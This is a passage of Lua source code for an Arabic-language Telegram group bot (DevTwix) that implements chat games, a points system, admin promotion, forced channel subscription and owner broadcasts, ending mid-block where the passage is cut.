--===========<<<<<•𝗗𝗲𝘃𝗧𝘄𝗶𝘅•>>>>>>============--|
---------------------------------------------------------------------------------------
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) or text == '» اسئله ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum8'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','⋄︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','⋄︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','⋄︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','⋄︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','⋄︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','⋄︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','⋄︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','⋄︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','⋄︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','⋄︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','⋄︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','⋄︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','⋄︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','⋄︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','⋄︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','⋄︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','⋄︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','⋄︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','⋄︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','⋄︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','⋄︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','⋄︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','⋄︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','⋄︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','⋄︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','⋄︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','⋄︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','⋄︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','⋄︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
DevTwixTeam = name..'\n⋄︙ارسل الجواب الصحيح فقط'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum8'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevHmD:del(DevTwix..'HmD:GameNum8'..msg.chat_id_)
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » الاسئله للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end  
---------------------------------------------------------------------------------------
--===========<<<<<•𝗗𝗲𝘃𝗧𝘄𝗶𝘅•>>>>>>============--|
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevHmD:get(DevTwix.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevHmD:del(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevHmD:del(DevTwix.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙*التخمين الصحيح هو* » '..NUM..'\n⋄︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevHmD:incrby(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevHmD:get(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevHmD:del(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevHmD:del(DevTwix.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙*التخمين الصحيح هو* » '..GETNUM..'\n⋄︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevHmD:get(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevHmD:get(DevTwix..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) or text == '» تخمين ✧' and ChCheck(msg) then   
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevHmD:set(DevTwix.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙اهلا بك عزيزي في لعبة التخمين » \n •••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⋄︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevHmD:setex(DevTwix.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
---------------------------------------------------------------------------------------
if text == 'روليت' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD:del(DevTwix.."HmD:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevHmD:del(DevTwix..'HmD:ListRolet'..msg.chat_id_)  
DevHmD:setex(DevTwix.."HmD:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevHmD:get(DevTwix.."HmD:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "⋄︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevHmD:set(DevTwix.."HmD:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '⋄︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⋄︙الفائز يحصل على 5 نقاط عدد المطلوبين » '..text..' لاعب'
end
DevHmD:del(DevTwix.."HmD:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevHmD:get(DevTwix.."HmD:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevHmD:sismember(DevTwix..'HmD:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'⋄︙المعرف » ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevHmD:sadd(DevTwix..'HmD:ListRolet'..msg.chat_id_,text)
local CountAdd = DevHmD:get(DevTwix.."HmD:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevHmD:scard(DevTwix..'HmD:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevHmD:del(DevTwix.."HmD:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevHmD:setex(DevTwix.."HmD:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "⋄︙تم ادخال المعرف » ["..text.."]\n⋄︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "⋄︙تم ادخال المعرف » ["..text.."] وتبقى » "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
---------------------------------------------------------------------------------------
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) or text == '» الالعاب ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1,[[
⋄︙قائمة العاب المجموعه » 
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙لعبة التخمين » خمن
⋄︙لعبة الامثله » امثله
⋄︙لعبة العكس » العكس
⋄︙لعبة الاسئله » اسئله
⋄︙لعبة الروليت » روليت
⋄︙لعبة الحزوره » حزوره
⋄︙لعبة الترتيب » ترتيب
⋄︙لعبة المعاني » معاني
⋄︙لعبة التويت » كت تويت
⋄︙لعبة المختلف » المختلف
⋄︙لعبة السمايلات » سمايلات
⋄︙لعبة المحيبس » المحيبس
⋄︙لعبة الرياضيات » رياضيات
⋄︙لعبة الانكليزيه » انكليزيه
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙مجوهراتي • بيع مجوهراتي
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .
]], 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
---------------------------------------------------------------------------------------
if text == 'بيع مجوهراتي' and ChCheck(msg) then
if tonumber((DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لم تربح اي نقطه\n⋄︙ارسل » الالعاب للعب', 1, 'md')
else
DevHmD0 = (DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevHmD:incrby(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevHmD0)
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙تم بيع '..(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⋄︙كل نقطه تساوي 50 رساله', 'md')
DevHmD:del(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
---------------------------------------------------------------------------------------
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,HmD) 
local num = 0
local admins = HmD.members_  
for i=0 , #admins do   
if HmD.members_[i].bot_info_ == false and HmD.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if HmD.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevHmD:sadd(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_,Manager_id)  
DevHmD:sadd(DevTwix..'HmD:HmDConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا يوجد ادمنيه ليتم رفعهم\n⋄︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم رفع '..num..' من الادمنيه \n⋄︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
---------------------------------------------------------------------------------------
if text == 'غادر' and SudoBot(msg) and ChCheck(msg) then
if DevHmD:get(DevTwix.."HmD:Left:Bot"..DevTwix) then
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم مغادرة المجموعه \n⋄︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, DevTwix)
DevHmD:srem(DevTwix.."HmD:Groups",msg.chat_id_)
end
---------------------------------------------------------------------------------------
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙موقعك » '..rtpa, 1, 'md')
end,nil)
end
---------------------------------------------------------------------------------------
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevHmD:get(DevTwix..'HmD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevHmD:get(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙اسمك » ❨ ['..result.first_name_..'] ❩\n⋄︙معرفك » ❨ ['..username..'] ❩\n⋄︙ايديك » ❨ `'..result.id_..'` ❩\n⋄︙نقاطك » ❨ '..user_nkt..' ❩\n⋄︙رسائلك » ❨ '..user_msgs..' ❩\n⋄︙جهاتك » ❨ '..cont..' ❩\n⋄︙تفاعلك » '..formsgs(msguser)..'\n⋄︙رتبتك » '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
---------------------------------------------------------------------------------------
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "× ضع قناة الاشتراك ×" or text == "× تغيير كليشه الاشتراك ×" then
if not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
DevHmD:setex(DevTwix..'DevHmD4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '⋄︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" or text == "× تفعيل الاشتراك ×" then  
if not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
if DevHmD:get(DevTwix..'HmD:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevHmD:get(DevTwix.."HmD:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"⋄︙الاشتراك الاجباري مفعل \n⋄︙على القناة » [@"..GetInfo.result.username.."]")
else
DevHmD:setex(DevTwix..'DevHmD4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"⋄︙لاتوجد قناة لتفعيل الاشتراك\n⋄︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" or text == "× تعطيل الاشتراك ×" then  
if not Sudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:ChId')
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل الاشتراك الاجباري",'md')
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" or text == "× حذف قناه الاشتراك ×" then
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:ChId')
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' or text == '× قناة الاشتراك ×' then
if DevHmD:get(DevTwix..'HmD:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevHmD:get(DevTwix.."HmD:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "⋄︙قناة الاشتراك » [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "⋄︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
---------------------------------------------------------------------------------------
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function DevTwixTeam(extra,result,success)
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevHmD:smembers(DevTwix.."HmD:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevHmD:smembers(DevTwix.."HmD:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم اذاعة رسالتك بالتوجيه \n⋄︙‏في » *'..#GpList..'* مجموعه \n⋄︙والى » *'..#PvList..'* مشترك \n', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),DevTwixTeam)
end
end
---------------------------------------------------------------------------------------
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevHmD:set(DevTwix..'HmD:viewget'..msg.sender_user_id_,true)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
---------------------------------------------------------------------------------------
if text == "سورس" and ChTwixDev(msg) or text == "السورس" and ChTwixDev(msg) or text == "يا سورس" and ChTwixDev(msg) or text == "✧ سورس البوت ✧" and ChTwixDev(msg) then
Text = [[
*Welcome To Source*

⋄︙*TeAm *[DevTwiX](https://t.me/DevTwix)

⋄︙Channel [Files Twix ](https://t.me/TwixFiles)

⋄︙[Bot TwsL DevTwix](https://t.me/Y_8ibot)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '- Developer',url="t.me/VLVLVI"}},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DevTwix&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if text == "رابط حذف" and ChTwixDev(msg)  or text == "رابط الحذف" and ChTwixDev(msg) or text == "اريد رابط الحذف" and ChTwixDev(msg) or  text == "شمرلي رابط الحذف" and ChTwixDev(msg) or text == "اريد رابط حذف" and ChTwixDev(msg) or text == "بوت الحذف" and ChTwixDev(msg) or text == "اريد بوت الحذف" and ChTwixDev(msg) or text == "اريد بوت حذف" and ChTwixDev(msg) or text == "بوت حذف" and ChTwixDev(msg) or text == "بوت حذف حسابات" and ChTwixDev(msg) or text == "راح احذف" and ChTwixDev(msg) then
local Text = [[⋄︙*لحذف حسابك اختر احد المواقع ..
⋄︙يمكنك الحذف من الروابط التالية ..
 ( انستا + فيس + تليكرام + سناب )
⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ *]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="Telegram",callback_data="/TLHelpList:"..msg.sender_user_id_},{text="instagram",callback_data="/ineHelpList:"..msg.sender_user_id_}},
{{text="Snspchat",callback_data="/SneHelpList:"..msg.sender_user_id_},{text="Facebook",callback_data="/FseHelpList:"..msg.sender_user_id_}},
{{text = '᥀ TeaM Twix ˛', url="https://t.me/DevTwix"},},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
---------------------------------------------------------------------------------------
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevHmD:get(DevTwix.."HmD:Kick:Me"..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevHmD:set(DevTwix..'yes'..msg.sender_user_id_, 'delyes')
DevHmD:set(DevTwix..'no'..msg.sender_user_id_, 'delno')
local Text = '⋄︙*هل انت متأكد من المغادره*'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
---------------------------------------------------------------------------------------
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل امر اطردني",'md')
HmDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevTwixTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevHmD:del(DevTwix.."HmD:Kick:Me"..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل امر اطردني",'md')
end
---------------------------------------------------------------------------------------
if text == "نزلني" and ChCheck(msg) then
if DevHmD:get(DevTwix.."HmD:Del:Me"..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevHmD:set(DevTwix..'yesdel'..msg.sender_user_id_, 'delyes')
DevHmD:set(DevTwix..'nodel'..msg.sender_user_id_, 'delno')
local Text = '⋄︙*هل انت متأكد من تنزيلك*'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
---------------------------------------------------------------------------------------
if text == 'تعطيل نزلني' and HMDicConstructor(msg) and ChCheck(msg) then
DevHmD:set(DevTwix.."HmD:Del:Me"..msg.chat_id_, true)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل امر نزلني",'md')
end
if text == 'تفعيل نزلني' and HMDicConstructor(msg) and ChCheck(msg) then
DevHmD:del(DevTwix.."HmD:Del:Me"..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل امر نزلني",'md')
end
---------------------------------------------------------------------------------------
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل التاك بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل التاك بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:TagAll'..msg.chat_id_) then
